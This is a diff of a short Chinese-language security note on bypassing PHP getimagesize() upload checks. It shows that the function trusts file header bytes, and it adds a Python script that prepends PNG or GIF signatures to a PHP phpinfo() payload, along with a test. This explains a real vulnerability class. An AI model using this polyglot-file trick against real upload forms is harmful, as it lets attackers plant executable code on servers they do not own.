@@ -1,9 +1,13 @@
+# getimagesize图片验证绕过
+
 参考：
+
 - https://0x1.im/blog/php/php-function-getimagesize.html
 
 (PHP 4, PHP 5, PHP 7)
 
-解析：
+**解析：**
+
 ```c
 PHPAPI int php_getimagetype(php_stream * stream, char *filetype TSRMLS_DC)
 {
@@ -25,17 +29,29 @@ PHPAPI const char php_sig_png[8] = {(char) 0x89, (char) 0x50, (char) 0x4e, (char
 
 可以看出来 image type 是根据文件流的前几个字节（文件头）来判断的
 
-demo
+**测试代码**
+
 ```
 <?php
 print_r(getimagesize('test.php'));
 ```
 
-exp.png
-```
-<?php phpinfo(); ?>
+利用python脚本生成文件
 
-3C3F 7068 7020 7068 7069 6E66 6F28 293B 203F 3E
-
-8950 4E47 0D0A 1A0A 3C3F 7068 7020 7068 7069 6E66 6F28 293B 203F 3E
+```python
+with open('png.php','wb') as f:
+    f.write(b'\x89PNG\r\n\x1a\n<?php phpinfo(); ?>')
+with open('gif.php','wb') as f:
+    f.write(b'GIF89a<?php phpinfo(); ?>')
 ```
+
+测试
+
+```php
+<?php
+print_r(getimagesize('png.php'));
+print_r(getimagesize('gif.php'));
+```
+
+![](/images/19-7-23_PHP_getimagesize图片验证绕过_1.png)
+
